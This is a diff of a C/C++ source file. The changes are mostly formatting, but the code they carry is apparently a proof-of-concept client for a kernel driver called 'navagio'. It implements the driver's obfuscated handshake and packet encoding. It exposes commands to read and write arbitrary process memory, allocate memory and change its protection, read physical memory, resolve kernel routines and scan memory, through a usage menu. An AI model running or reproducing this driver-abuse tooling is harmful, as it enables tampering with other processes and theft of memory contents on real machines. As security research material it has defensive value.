@@ -161,7 +161,7 @@ typedef struct navagio_scan_options {
 #define LCG_MULTIPLIER 0x5851f42d4c957f2dull
 #define LCG_MODULUS 0xfffffffffffffff0ull
 
-static uint32_t navagio_get_u32(const void *data) {
+static uint32_t navagio_get_u32(const void* data) {
     uint32_t value;
 
     memcpy(&value, data, sizeof(value));
@@ -169,7 +169,7 @@ static uint32_t navagio_get_u32(const void *data) {
 }
 
 
-static uint64_t navagio_get_u64(const void *data) {
+static uint64_t navagio_get_u64(const void* data) {
     uint64_t value;
 
     memcpy(&value, data, sizeof(value));
@@ -177,12 +177,12 @@ static uint64_t navagio_get_u64(const void *data) {
 }
 
 
-static void navagio_put_u32(void *data, uint32_t value) {
+static void navagio_put_u32(void* data, uint32_t value) {
     memcpy(data, &value, sizeof(value));
 }
 
 
-static void navagio_put_u64(void *data, uint64_t value) {
+static void navagio_put_u64(void* data, uint64_t value) {
     memcpy(data, &value, sizeof(value));
 }
 
@@ -208,7 +208,7 @@ static uint64_t mix(uint64_t x) {
 }
 
 
-static void transform(uint8_t *data, size_t size, uint64_t state, int decrypt) {
+static void transform(uint8_t* data, size_t size, uint64_t state, int decrypt) {
     uint64_t previous = 0;
     size_t offset;
 
@@ -222,12 +222,12 @@ static void transform(uint8_t *data, size_t size, uint64_t state, int decrypt) {
 }
 
 
-static void navagio_encode(navagio_packet *packet, uint64_t key) {
+static void navagio_encode(navagio_packet* packet, uint64_t key) {
     transform(packet->bytes, sizeof(packet->bytes), ~(navagio_get_u64(packet->bytes) ^ key), 0);
 }
 
 
-static void navagio_decode(navagio_packet *packet, uint64_t key) {
+static void navagio_decode(navagio_packet* packet, uint64_t key) {
     transform(packet->bytes, sizeof(packet->bytes), ~(navagio_get_u64(packet->bytes) ^ key), 1);
 }
 
@@ -250,7 +250,7 @@ static uint64_t handshake_mix(uint64_t value) {
 }
 
 
-static void navagio_make_registration(navagio_packet *packet, uint32_t pid, uint32_t timestamp_high) {
+static void navagio_make_registration(navagio_packet* packet, uint32_t pid, uint32_t timestamp_high) {
     uint64_t a = 0, b = 0;
     size_t offset = 0x48;
     unsigned int iteration;
@@ -277,19 +277,19 @@ static void navagio_make_registration(navagio_packet *packet, uint32_t pid, uint
 }
 
 
-static int is_open(const poc *client) {
+static int is_open(const poc* client) {
     return client && client->device && client->device != INVALID_HANDLE_VALUE;
 }
 
 
-static DWORD random_bytes(void *data, ULONG size) {
+static DWORD random_bytes(void* data, ULONG size) {
     NTSTATUS status = BCryptGenRandom(NULL, (PUCHAR)data, size, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 
     return status >= 0 ? ERROR_SUCCESS : ERROR_GEN_FAILURE;
 }
 
 
-static DWORD navagio_open(poc *client, const wchar_t *device_path) {
+static DWORD navagio_open(poc* client, const wchar_t* device_path) {
     if (!client) {
         return ERROR_INVALID_PARAMETER;
     }
@@ -305,7 +305,7 @@ static DWORD navagio_open(poc *client, const wchar_t *device_path) {
 }
 
 
-static DWORD navagio_close(poc *client) {
+static DWORD navagio_close(poc* client) {
     if (!client) {
         return ERROR_INVALID_PARAMETER;
     }
@@ -318,7 +318,7 @@ static DWORD navagio_close(poc *client) {
 }
 
 
-static DWORD exchange_packet(poc *client, navagio_packet *packet, uint32_t *sent_challenge) {
+static DWORD exchange_packet(poc* client, navagio_packet* packet, uint32_t* sent_challenge) {
     navagio_packet wire;
     uint8_t entropy[12];
     DWORD returned = 0;
@@ -355,13 +355,13 @@ static DWORD exchange_packet(poc *client, navagio_packet *packet, uint32_t *sent
 }
 
 
-static int valid_reply(const navagio_packet *packet, uint32_t command, uint32_t challenge) {
+static int valid_reply(const navagio_packet* packet, uint32_t command, uint32_t challenge) {
     return navagio_get_u32(packet->bytes + NAVAGIO_OFF_COMMAND) == command && navagio_get_u32(packet->bytes + NAVAGIO_OFF_SUCCESS) == 1u &&
-           navagio_get_u32(packet->bytes + NAVAGIO_OFF_CHALLENGE) == navagio_challenge_response(challenge);
+        navagio_get_u32(packet->bytes + NAVAGIO_OFF_CHALLENGE) == navagio_challenge_response(challenge);
 }
 
 
-static DWORD navagio_register(poc *client) {
+static DWORD navagio_register(poc* client) {
     navagio_packet packet;
     uint32_t challenge, session;
     DWORD error;
@@ -378,7 +378,8 @@ static DWORD navagio_register(poc *client) {
         session = navagio_get_u32(packet.bytes + NAVAGIO_OFF_SESSION);
         if (!valid_reply(&packet, NAVAGIO_CMD_REGISTER, challenge) || !session || (session & (session - 1u))) {
             error = ERROR_INVALID_DATA;
-        } else {
+        }
+        else {
             client->session = session;
             client->key = navagio_get_u64(packet.bytes + NAVAGIO_OFF_NEW_KEY);
         }
@@ -388,8 +389,8 @@ static DWORD navagio_register(poc *client) {
 }
 
 
-static DWORD navagio_ping(poc *client, uint32_t *challenge, uint32_t *response) {
-    navagio_packet packet = {{0}};
+static DWORD navagio_ping(poc* client, uint32_t* challenge, uint32_t* response) {
+    navagio_packet packet = { {0} };
     uint32_t sent;
     DWORD error;
 
@@ -414,7 +415,7 @@ static DWORD navagio_ping(poc *client, uint32_t *challenge, uint32_t *response) 
 }
 
 
-static DWORD navagio_exchange(poc *client, navagio_packet *packet) {
+static DWORD navagio_exchange(poc* client, navagio_packet* packet) {
     uint32_t challenge;
 
     if (!is_open(client) || !client->session || !packet) {
@@ -427,7 +428,7 @@ static DWORD navagio_exchange(poc *client, navagio_packet *packet) {
 }
 
 
-static DWORD navagio_command(poc *client, navagio_packet *packet) {
+static DWORD navagio_command(poc* client, navagio_packet* packet) {
     uint32_t challenge, command;
     DWORD error;
 
@@ -472,8 +473,8 @@ static DWORD navagio_command(poc *client, navagio_packet *packet) {
 }
 
 
-static DWORD notify_packet(poc *client, uint32_t command, uint32_t pid) {
-    uint8_t packet[NAVAGIO_NOTIFY_SIZE] = {0};
+static DWORD notify_packet(poc* client, uint32_t command, uint32_t pid) {
+    uint8_t packet[NAVAGIO_NOTIFY_SIZE] = { 0 };
     DWORD returned = 0;
     DWORD error;
     size_t i;
@@ -502,7 +503,7 @@ static DWORD notify_packet(poc *client, uint32_t command, uint32_t pid) {
     return ERROR_SUCCESS;
 }
 
-static DWORD navagio_notify_process(poc *client, uint32_t pid) {
+static DWORD navagio_notify_process(poc* client, uint32_t pid) {
     if (!pid) {
         return ERROR_INVALID_PARAMETER;
     }
@@ -510,21 +511,21 @@ static DWORD navagio_notify_process(poc *client, uint32_t pid) {
 }
 
 
-_Static_assert(sizeof(navagio_process_info) == 0x248, "process record size");
-_Static_assert(offsetof(navagio_process_info, image_path) == 0x3e, "process path offset");
+static_assert(sizeof(navagio_process_info) == 0x248, "process record size");
+static_assert(offsetof(navagio_process_info, image_path) == 0x3e, "process path offset");
 
-static void initialize(navagio_packet *packet, uint32_t command) {
+static void initialize(navagio_packet* packet, uint32_t command) {
     memset(packet, 0, sizeof(*packet));
     navagio_put_u32(packet->bytes + NAVAGIO_OFF_COMMAND, command);
 }
 
 
-static void target(navagio_packet *packet, uint32_t pid) {
+static void target(navagio_packet* packet, uint32_t pid) {
     navagio_put_u32(packet->bytes + 0x38, pid);
 }
 
 
-static DWORD native_result(poc *client, navagio_packet *packet, DWORD error) {
+static DWORD native_result(poc* client, navagio_packet* packet, DWORD error) {
     if (client && client->last_driver_status != UINT32_MAX) {
         client->last_ntstatus = (int32_t)navagio_get_u32(packet->bytes + 0x28);
     }
@@ -532,7 +533,7 @@ static DWORD native_result(poc *client, navagio_packet *packet, DWORD error) {
 }
 
 
-static DWORD navagio_get_version(poc *client, navagio_version *version) {
+static DWORD navagio_get_version(poc* client, navagio_version* version) {
     navagio_packet packet;
     DWORD error;
 
@@ -550,7 +551,7 @@ static DWORD navagio_get_version(poc *client, navagio_version *version) {
 }
 
 
-static DWORD navagio_open_process(poc *client, uint32_t pid, int attach_method, HANDLE *process) {
+static DWORD navagio_open_process(poc* client, uint32_t pid, int attach_method, HANDLE* process) {
     navagio_packet packet;
     DWORD error;
 
@@ -572,7 +573,7 @@ static DWORD navagio_open_process(poc *client, uint32_t pid, int attach_method, 
 }
 
 
-static DWORD navagio_allocate_memory(poc *client, uint32_t pid, uint64_t *address, size_t *size, uint32_t allocation_type, uint32_t protection) {
+static DWORD navagio_allocate_memory(poc* client, uint32_t pid, uint64_t* address, size_t* size, uint32_t allocation_type, uint32_t protection) {
     navagio_packet packet;
     DWORD error;
 
@@ -594,7 +595,7 @@ static DWORD navagio_allocate_memory(poc *client, uint32_t pid, uint64_t *addres
 }
 
 
-static DWORD navagio_free_memory(poc *client, uint32_t pid, uint64_t *address, size_t *size, uint32_t free_type) {
+static DWORD navagio_free_memory(poc* client, uint32_t pid, uint64_t* address, size_t* size, uint32_t free_type) {
     navagio_packet packet;
     DWORD error;
 
@@ -618,7 +619,7 @@ static DWORD navagio_free_memory(poc *client, uint32_t pid, uint64_t *address, s
 }
 
 
-static DWORD navagio_protect_memory(poc *client, uint32_t pid, uint64_t *address, size_t *size, uint32_t protection, uint32_t *old_protection) {
+static DWORD navagio_protect_memory(poc* client, uint32_t pid, uint64_t* address, size_t* size, uint32_t protection, uint32_t* old_protection) {
     navagio_packet packet;
     DWORD error;
 
@@ -641,7 +642,7 @@ static DWORD navagio_protect_memory(poc *client, uint32_t pid, uint64_t *address
 }
 
 
-static DWORD navagio_query_memory(poc *client, uint32_t pid, uint64_t address, MEMORY_BASIC_INFORMATION *information) {
+static DWORD navagio_query_memory(poc* client, uint32_t pid, uint64_t address, MEMORY_BASIC_INFORMATION* information) {
     navagio_packet packet;
     DWORD error;
     uint64_t returned;
@@ -665,7 +666,7 @@ static DWORD navagio_query_memory(poc *client, uint32_t pid, uint64_t address, M
 }
 
 
-static DWORD transfer(poc *client, uint32_t command, uint32_t pid, uint64_t address, const void *buffer, size_t size, size_t *transferred) {
+static DWORD transfer(poc* client, uint32_t command, uint32_t pid, uint64_t address, const void* buffer, size_t size, size_t* transferred) {
     navagio_packet packet;
     DWORD error;
     uint64_t done;
@@ -696,17 +697,17 @@ static DWORD transfer(poc *client, uint32_t command, uint32_t pid, uint64_t addr
 }
 
 
-static DWORD navagio_read_memory(poc *client, uint32_t pid, uint64_t address, void *buffer, size_t size, size_t *transferred) {
+static DWORD navagio_read_memory(poc* client, uint32_t pid, uint64_t address, void* buffer, size_t size, size_t* transferred) {
     return transfer(client, NAVAGIO_CMD_READ_MEMORY, pid, address, buffer, size, transferred);
 }
 
 
-static DWORD navagio_write_memory(poc *client, uint32_t pid, uint64_t address, const void *buffer, size_t size, size_t *transferred) {
+static DWORD navagio_write_memory(poc* client, uint32_t pid, uint64_t address, const void* buffer, size_t size, size_t* transferred) {
     return transfer(client, NAVAGIO_CMD_WRITE_MEMORY, pid, address, buffer, size, transferred);
 }
 
 
-static DWORD navagio_get_process_ids(poc *client, uint64_t *identifiers, uint32_t *count) {
+static DWORD navagio_get_process_ids(poc* client, uint64_t* identifiers, uint32_t* count) {
     navagio_packet packet;
     DWORD error;
     uint32_t capacity;
@@ -732,7 +733,7 @@ static DWORD navagio_get_process_ids(poc *client, uint64_t *identifiers, uint32_
 }
 
 
-static DWORD process_info(poc *client, uint32_t pid, uint64_t identifier, navagio_process_info *information) {
+static DWORD process_info(poc* client, uint32_t pid, uint64_t identifier, navagio_process_info* information) {
     navagio_packet packet;
     DWORD error;
 
@@ -753,17 +754,17 @@ static DWORD process_info(poc *client, uint32_t pid, uint64_t identifier, navagi
 }
 
 
-static DWORD navagio_get_process_info(poc *client, uint32_t pid, navagio_process_info *information) {
+static DWORD navagio_get_process_info(poc* client, uint32_t pid, navagio_process_info* information) {
     return process_info(client, pid, 0, information);
 }
 
 
-static DWORD navagio_get_process_info_by_id(poc *client, uint64_t identifier, navagio_process_info *information) {
+static DWORD navagio_get_process_info_by_id(poc* client, uint64_t identifier, navagio_process_info* information) {
     return process_info(client, 0, identifier, information);
 }
 
 
-static DWORD navagio_get_process_records(poc *client, navagio_process_info *records, uint32_t *count) {
+static DWORD navagio_get_process_records(poc* client, navagio_process_info* records, uint32_t* count) {
     navagio_packet packet;
     DWORD error;
     uint32_t capacity, i;
@@ -794,7 +795,7 @@ static DWORD navagio_get_process_records(poc *client, navagio_process_info *reco
 }
 
 
-static DWORD navagio_system_routine(poc *client, const wchar_t *name, uint64_t *address) {
+static DWORD navagio_system_routine(poc* client, const wchar_t* name, uint64_t* address) {
     navagio_packet packet;
     DWORD error;
     size_t length;
@@ -822,20 +823,20 @@ static DWORD navagio_system_routine(poc *client, const wchar_t *name, uint64_t *
 
 #define NVXE_MAGIC 0x4e565845u
 
-_Static_assert(sizeof(navagio_bus_config) == 0x1008, "bus configuration record size");
-_Static_assert(sizeof(navagio_image_record) == 0x438, "image record size");
-_Static_assert(offsetof(navagio_image_record, name) == 0x24, "image name offset");
-_Static_assert(offsetof(navagio_image_record, path) == 0x22e, "image path offset");
-_Static_assert(sizeof(navagio_nmi_record) == 0x280, "NMI record size");
-_Static_assert(sizeof(navagio_scan_record) == 0x50, "scan record size");
+static_assert(sizeof(navagio_bus_config) == 0x1008, "bus configuration record size");
+static_assert(sizeof(navagio_image_record) == 0x438, "image record size");
+static_assert(offsetof(navagio_image_record, name) == 0x24, "image name offset");
+static_assert(offsetof(navagio_image_record, path) == 0x22e, "image path offset");
+static_assert(sizeof(navagio_nmi_record) == 0x280, "NMI record size");
+static_assert(sizeof(navagio_scan_record) == 0x50, "scan record size");
 
-static void initialize_extra(navagio_packet *packet, uint32_t command) {
+static void initialize_extra(navagio_packet* packet, uint32_t command) {
     memset(packet, 0, sizeof(*packet));
     navagio_put_u32(packet->bytes + NAVAGIO_OFF_COMMAND, command);
 }
 
 
-static DWORD navagio_next_event(poc *client, uint32_t filter, navagio_event *event) {
+static DWORD navagio_next_event(poc* client, uint32_t filter, navagio_event* event) {
     navagio_packet packet;
     DWORD error;
 
@@ -858,7 +859,7 @@ static DWORD navagio_next_event(poc *client, uint32_t filter, navagio_event *eve
 }
 
 
-static DWORD navagio_initialize_features(poc *client, const uint32_t *ids, uint32_t count) {
+static DWORD navagio_initialize_features(poc* client, const uint32_t* ids, uint32_t count) {
     navagio_packet packet;
     uint32_t i;
 
@@ -879,7 +880,7 @@ static DWORD navagio_initialize_features(poc *client, const uint32_t *ids, uint3
 }
 
 
-static DWORD navagio_read_physical(poc *client, uint64_t address, void *buffer, size_t size) {
+static DWORD navagio_read_physical(poc* client, uint64_t address, void* buffer, size_t size) {
     navagio_packet packet;
 
     if (!buffer || !size || size > MAX_TRANSFER || address > UINT64_MAX - (size - 1u)) {
@@ -893,7 +894,7 @@ static DWORD navagio_read_physical(poc *client, uint64_t address, void *buffer, 
 }
 
 
-static DWORD navagio_get_bus_configs(poc *client, navagio_bus_config *records, uint32_t *count, uint32_t *examined) {
+static DWORD navagio_get_bus_configs(poc* client, navagio_bus_config* records, uint32_t* count, uint32_t* examined) {
     navagio_packet packet;
     uint32_t capacity, i;
     DWORD error;
@@ -929,7 +930,7 @@ static DWORD navagio_get_bus_configs(poc *client, navagio_bus_config *records, u
 }
 
 
-static DWORD navagio_nvxe_configure(poc *client, uint32_t pid, uint64_t parameter, const void *configuration, size_t configuration_size, const void *auxiliary, size_t auxiliary_size) {
+static DWORD navagio_nvxe_configure(poc* client, uint32_t pid, uint64_t parameter, const void* configuration, size_t configuration_size, const void* auxiliary, size_t auxiliary_size) {
     navagio_packet packet;
     DWORD error;
 
@@ -952,7 +953,7 @@ static DWORD navagio_nvxe_configure(poc *client, uint32_t pid, uint64_t paramete
 }
 
 
-static DWORD navagio_nvxe_clear(poc *client) {
+static DWORD navagio_nvxe_clear(poc* client) {
     navagio_packet packet;
 
     initialize_extra(&packet, NAVAGIO_CMD_NVXE_CLEAR);
@@ -961,7 +962,7 @@ static DWORD navagio_nvxe_clear(poc *client) {
 }
 
 
-static DWORD navagio_read_memory_physical(poc *client, uint32_t pid, uint64_t address, void *buffer, size_t size) {
+static DWORD navagio_read_memory_physical(poc* client, uint32_t pid, uint64_t address, void* buffer, size_t size) {
     navagio_packet packet;
 
     if (!pid || !address || !buffer || !size || size > MAX_TRANSFER || address > UINT64_MAX - (size - 1u)) {
@@ -977,7 +978,7 @@ static DWORD navagio_read_memory_physical(poc *client, uint32_t pid, uint64_t ad
 }
 
 
-static DWORD navagio_cache_dwm_process(poc *client, uint64_t *identifier) {
+static DWORD navagio_cache_dwm_process(poc* client, uint64_t* identifier) {
     navagio_packet packet;
     DWORD error;
 
@@ -994,7 +995,7 @@ static DWORD navagio_cache_dwm_process(poc *client, uint64_t *identifier) {
 }
 
 
-static DWORD record_array(poc *client, uint32_t command, void *records, uint32_t *count, uint32_t maximum) {
+static DWORD record_array(poc* client, uint32_t command, void* records, uint32_t* count, uint32_t maximum) {
     navagio_packet packet;
     uint32_t capacity;
     DWORD error;
@@ -1012,14 +1013,15 @@ static DWORD record_array(poc *client, uint32_t command, void *records, uint32_t
         if (!error && *count > capacity) {
             return ERROR_INVALID_DATA;
         }
-    } else if (error == ERROR_NO_MORE_ITEMS) {
+    }
+    else if (error == ERROR_NO_MORE_ITEMS) {
         *count = 0;
     }
     return error;
 }
 
 
-static DWORD navagio_get_image_records(poc *client, navagio_image_record *records, uint32_t *count) {
+static DWORD navagio_get_image_records(poc* client, navagio_image_record* records, uint32_t* count) {
     uint32_t i;
     DWORD error;
 
@@ -1037,7 +1039,7 @@ static DWORD navagio_get_image_records(poc *client, navagio_image_record *record
 }
 
 
-static DWORD navagio_get_image_record_by_name(poc *client, const wchar_t *name, navagio_image_record *record) {
+static DWORD navagio_get_image_record_by_name(poc* client, const wchar_t* name, navagio_image_record* record) {
     size_t length;
     uint32_t count = 1;
     DWORD error;
@@ -1059,7 +1061,7 @@ static DWORD navagio_get_image_record_by_name(poc *client, const wchar_t *name, 
 }
 
 
-static DWORD navagio_get_nmi_records(poc *client, navagio_nmi_record *records, uint32_t *count) {
+static DWORD navagio_get_nmi_records(poc* client, navagio_nmi_record* records, uint32_t* count) {
     uint32_t required = 0;
     DWORD error;
 
@@ -1084,7 +1086,7 @@ static DWORD navagio_get_nmi_records(poc *client, navagio_nmi_record *records, u
 }
 
 
-static DWORD scan(poc *client, uint32_t command, uint64_t address, size_t size, const wchar_t *name, const navagio_scan_options *options, navagio_scan_record *records, uint32_t *count) {
+static DWORD scan(poc* client, uint32_t command, uint64_t address, size_t size, const wchar_t* name, const navagio_scan_options* options, navagio_scan_record* records, uint32_t* count) {
     navagio_packet packet;
     size_t offset = command == NAVAGIO_CMD_SCAN_IMAGE ? 0x230 : 0x38;
     size_t name_length = 0;
@@ -1099,7 +1101,8 @@ static DWORD scan(poc *client, uint32_t command, uint64_t address, size_t size, 
         if (!name || !(name_length = wcsnlen_s(name, 260)) || name_length >= 260) {
             return ERROR_INVALID_PARAMETER;
         }
-    } else if (!size || size > MAX_TRANSFER || address > UINT64_MAX - (size - 1u)) {
+    }
+    else if (!size || size > MAX_TRANSFER || address > UINT64_MAX - (size - 1u)) {
         return ERROR_INVALID_PARAMETER;
     }
     if (command == NAVAGIO_CMD_SCAN_PHYSICAL && (options->process_mode || options->pid || options->process_identifier)) {
@@ -1109,7 +1112,8 @@ static DWORD scan(poc *client, uint32_t command, uint64_t address, size_t size, 
     initialize_extra(&packet, command);
     if (name_length) {
         memcpy(packet.bytes + 0x28, name, name_length * sizeof(*name));
-    } else {
+    }
+    else {
         navagio_put_u64(packet.bytes + 0x28, address);
         navagio_put_u64(packet.bytes + 0x30, size);
     }
@@ -1122,7 +1126,8 @@ static DWORD scan(poc *client, uint32_t command, uint64_t address, size_t size, 
         packet.bytes[0x82] = options->match_mode;
         navagio_put_u32(packet.bytes + 0x84, options->parameter);
         navagio_put_u64(packet.bytes + 0x88, (uintptr_t)records);
-    } else {
+    }
+    else {
         packet.bytes[offset + 0x4a] = options->process_mode;
         packet.bytes[offset + 0x4b] = options->match_mode;
         navagio_put_u32(packet.bytes + offset + 0x4c, options->parameter);
@@ -1141,22 +1146,22 @@ static DWORD scan(poc *client, uint32_t command, uint64_t address, size_t size, 
 }
 
 
-static DWORD navagio_scan_memory(poc *client, uint64_t address, size_t size, const navagio_scan_options *options, navagio_scan_record *records, uint32_t *count) {
+static DWORD navagio_scan_memory(poc* client, uint64_t address, size_t size, const navagio_scan_options* options, navagio_scan_record* records, uint32_t* count) {
     return scan(client, NAVAGIO_CMD_SCAN_MEMORY, address, size, NULL, options, records, count);
 }
 
 
-static DWORD navagio_scan_physical(poc *client, uint64_t address, size_t size, const navagio_scan_options *options, navagio_scan_record *records, uint32_t *count) {
+static DWORD navagio_scan_physical(poc* client, uint64_t address, size_t size, const navagio_scan_options* options, navagio_scan_record* records, uint32_t* count) {
     return scan(client, NAVAGIO_CMD_SCAN_PHYSICAL, address, size, NULL, options, records, count);
 }
 
 
-static DWORD navagio_scan_image(poc *client, const wchar_t *name, const navagio_scan_options *options, navagio_scan_record *records, uint32_t *count) {
+static DWORD navagio_scan_image(poc* client, const wchar_t* name, const navagio_scan_options* options, navagio_scan_record* records, uint32_t* count) {
     return scan(client, NAVAGIO_CMD_SCAN_IMAGE, 0, 0, name, options, records, count);
 }
 
 
-static DWORD navagio_inspect_pages(poc *client, uint32_t pid, uint64_t begin, uint64_t end, uint32_t flags, uint32_t parameter, uint32_t *result) {
+static DWORD navagio_inspect_pages(poc* client, uint32_t pid, uint64_t begin, uint64_t end, uint32_t flags, uint32_t parameter, uint32_t* result) {
     navagio_packet packet;
 
     if (!pid || !result || begin >= end) {
@@ -1176,43 +1181,43 @@ static DWORD navagio_inspect_pages(poc *client, uint32_t pid, uint64_t begin, ui
 
 static void navagio_commands_usage(void) {
     puts("Additional commands (PID accepts 'self'; numbers accept 0x prefixes):\n"
-         "  version                           Query protocol family/revision\n"
-         "  open-process PID [attached]        Obtain and verify a process handle\n"
-         "  alloc PID SIZE [PROTECT]           Allocate committed virtual memory\n"
-         "  free PID ADDRESS                   Release an entire allocation\n"
-         "  query PID ADDRESS                  Query virtual memory attributes\n"
-         "  protect PID ADDRESS SIZE PROTECT   Change virtual memory protection\n"
-         "  read PID ADDRESS SIZE FILE         Save process memory (max 64 MiB)\n"
-         "  write PID ADDRESS FILE             Write file bytes (max 64 MiB)\n"
-         "  process-info PID                   Query a cached process record\n"
-         "  process-info-id ID                 Query by an opaque cached ID\n"
-         "  processes                          List cached PID, parent PID, path\n"
-         "  process-ids                        List opaque cached object IDs\n"
-         "  resolve NAME                       Resolve an exported kernel routine\n"
-         "  notify-process PID                 Submit an 80-byte process notification\n"
-         "  next-event [TYPE] [FILE]            Consume an event (TYPE: 0, 1, 2)\n"
-         "  init-features [ID ...]              Initialize up to 8 driver features\n"
-         "  read-physical ADDRESS SIZE FILE    Save physical memory\n"
-         "  bus-configs FILE                   Save device configuration records\n"
-         "  nvxe-configure PID PARAM FILE [AUX] Upload an NVXE configuration\n"
-         "  nvxe-clear                         Clear ALL NVXE configurations\n"
-         "  read-via-physical PID ADDR SIZE FILE Alternate process-memory read\n"
-         "  cache-dwm                          Cache this session's DWM process\n"
-         "  images FILE [CAPACITY]             Save image-cache records\n"
-         "  image NAME FILE                   Save one cached image record\n"
-         "  nmi-capacity                       Query NMI capacity without collection\n"
-         "  nmi FILE                          Collect NMI diagnostic records\n"
-         "  scan-memory PID ADDR SIZE PAT FILE [COUNT BYTE MODE MATCH PARAM]\n"
-         "  scan-physical ADDR SIZE PAT FILE   [COUNT BYTE MODE MATCH PARAM]\n"
-         "  scan-image PID NAME PAT FILE       [COUNT BYTE MODE MATCH PARAM]\n"
-         "    PAT is a 1..64-byte pattern file; FILE receives 80-byte records.\n"
-         "    scan-image PID=0 selects kernel context. Options are driver-specific.\n"
-         "  inspect-pages PID BEGIN END FLAGS [PARAM]  Inspect page-table range\n");
+        "  version                           Query protocol family/revision\n"
+        "  open-process PID [attached]        Obtain and verify a process handle\n"
+        "  alloc PID SIZE [PROTECT]           Allocate committed virtual memory\n"
+        "  free PID ADDRESS                   Release an entire allocation\n"
+        "  query PID ADDRESS                  Query virtual memory attributes\n"
+        "  protect PID ADDRESS SIZE PROTECT   Change virtual memory protection\n"
+        "  read PID ADDRESS SIZE FILE         Save process memory (max 64 MiB)\n"
+        "  write PID ADDRESS FILE             Write file bytes (max 64 MiB)\n"
+        "  process-info PID                   Query a cached process record\n"
+        "  process-info-id ID                 Query by an opaque cached ID\n"
+        "  processes                          List cached PID, parent PID, path\n"
+        "  process-ids                        List opaque cached object IDs\n"
+        "  resolve NAME                       Resolve an exported kernel routine\n"
+        "  notify-process PID                 Submit an 80-byte process notification\n"
+        "  next-event [TYPE] [FILE]            Consume an event (TYPE: 0, 1, 2)\n"
+        "  init-features [ID ...]              Initialize up to 8 driver features\n"
+        "  read-physical ADDRESS SIZE FILE    Save physical memory\n"
+        "  bus-configs FILE                   Save device configuration records\n"
+        "  nvxe-configure PID PARAM FILE [AUX] Upload an NVXE configuration\n"
+        "  nvxe-clear                         Clear ALL NVXE configurations\n"
+        "  read-via-physical PID ADDR SIZE FILE Alternate process-memory read\n"
+        "  cache-dwm                          Cache this session's DWM process\n"
+        "  images FILE [CAPACITY]             Save image-cache records\n"
+        "  image NAME FILE                   Save one cached image record\n"
+        "  nmi-capacity                       Query NMI capacity without collection\n"
+        "  nmi FILE                          Collect NMI diagnostic records\n"
+        "  scan-memory PID ADDR SIZE PAT FILE [COUNT BYTE MODE MATCH PARAM]\n"
+        "  scan-physical ADDR SIZE PAT FILE   [COUNT BYTE MODE MATCH PARAM]\n"
+        "  scan-image PID NAME PAT FILE       [COUNT BYTE MODE MATCH PARAM]\n"
+        "    PAT is a 1..64-byte pattern file; FILE receives 80-byte records.\n"
+        "    scan-image PID=0 selects kernel context. Options are driver-specific.\n"
+        "  inspect-pages PID BEGIN END FLAGS [PARAM]  Inspect page-table range\n");
 }
 
 
-static int number(const wchar_t *text, uint64_t *value) {
-    wchar_t *end;
+static int number(const wchar_t* text, uint64_t* value) {
+    wchar_t* end;
 
     if (!text[0] || text[0] == L'-' || text[0] == L'+' || iswspace(text[0])) {
         return 0;
@@ -1223,7 +1228,7 @@ static int number(const wchar_t *text, uint64_t *value) {
 }
 
 
-static int pid_number(const wchar_t *text, uint32_t *pid) {
+static int pid_number(const wchar_t* text, uint32_t* pid) {
     uint64_t value;
 
     if (!wcscmp(text, L"self")) {
@@ -1238,8 +1243,8 @@ static int pid_number(const wchar_t *text, uint32_t *pid) {
 }
 
 
-static int read_bytes(const wchar_t *path, uint8_t **data, size_t *size) {
-    FILE *file = NULL;
+static int read_bytes(const wchar_t* path, uint8_t** data, size_t* size) {
+    FILE* file = NULL;
     __int64 length;
     int ok;
 
@@ -1251,7 +1256,7 @@ static int read_bytes(const wchar_t *path, uint8_t **data, size_t *size) {
         return 0;
     }
     *size = (size_t)length;
-    *data = (uint8_t *)malloc(*size);
+    *data = (uint8_t*)malloc(*size);
     ok = *data && fread(*data, 1, *size, file) == *size;
     if (fclose(file)) {
         ok = 0;
@@ -1264,8 +1269,8 @@ static int read_bytes(const wchar_t *path, uint8_t **data, size_t *size) {
 }
 
 
-static int write_bytes(const wchar_t *path, const void *data, size_t size) {
-    FILE *file = NULL;
+static int write_bytes(const wchar_t* path, const void* data, size_t size) {
+    FILE* file = NULL;
     int ok;
 
     if (_wfopen_s(&file, path, L"wb") || !file) {
@@ -1279,7 +1284,7 @@ static int write_bytes(const wchar_t *path, const void *data, size_t size) {
 }
 
 
-static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t *path, int *handled) {
+static int extra_cli(const wchar_t* cmd, int argc, wchar_t** args, const wchar_t* path, int* handled) {
     enum {
         NOTIFY,
         EVENT,
@@ -1301,19 +1306,19 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
         UNKNOWN
     } kind;
 
-    static const wchar_t *const names[] = {L"notify-process", L"next-event",        L"init-features", L"read-physical", L"bus-configs",   L"nvxe-configure",
+    static const wchar_t* const names[] = { L"notify-process", L"next-event",        L"init-features", L"read-physical", L"bus-configs",   L"nvxe-configure",
                                            L"nvxe-clear",     L"read-via-physical", L"cache-dwm",     L"images",        L"image",         L"nmi",
-                                           L"nmi-capacity",   L"scan-memory",       L"scan-physical", L"scan-image",    L"inspect-pages"};
+                                           L"nmi-capacity",   L"scan-memory",       L"scan-physical", L"scan-image",    L"inspect-pages" };
     poc client;
     uint32_t pid = 0, ids[8], count = 0, examined = 0, i;
     uint64_t address = 0, length = 0, parameter = 0, flags = 0;
-    navagio_scan_options options = {0};
-    const wchar_t *output = NULL;
-    uint8_t *data = NULL, *auxiliary = NULL;
+    navagio_scan_options options = { 0 };
+    const wchar_t* output = NULL;
+    uint8_t* data = NULL, * auxiliary = NULL;
     size_t size = 0, auxiliary_size = 0;
     DWORD error;
     int result = 0;
-    for (kind = NOTIFY; kind < UNKNOWN; ++kind) {
+    for (kind = NOTIFY; kind < UNKNOWN; kind = static_cast<decltype(kind)>(static_cast<int>(kind) + 1)) {
         if (!wcscmp(cmd, names[kind])) {
             break;
         }
@@ -1349,7 +1354,7 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
             goto bad_args;
         }
         size = (size_t)length;
-        data = (uint8_t *)calloc(1, size);
+        data = (uint8_t*)calloc(1, size);
         if (!data) {
             goto bad_args;
         }
@@ -1359,7 +1364,7 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
             goto bad_args;
         }
         size = (size_t)length;
-        data = (uint8_t *)calloc(1, size);
+        data = (uint8_t*)calloc(1, size);
         if (!data) {
             goto bad_args;
         }
@@ -1406,7 +1411,7 @@ static int extra_cli(const wchar_t *cmd, int argc, wchar_t **args, const wchar_t
     case SCAN_IMAGE: {
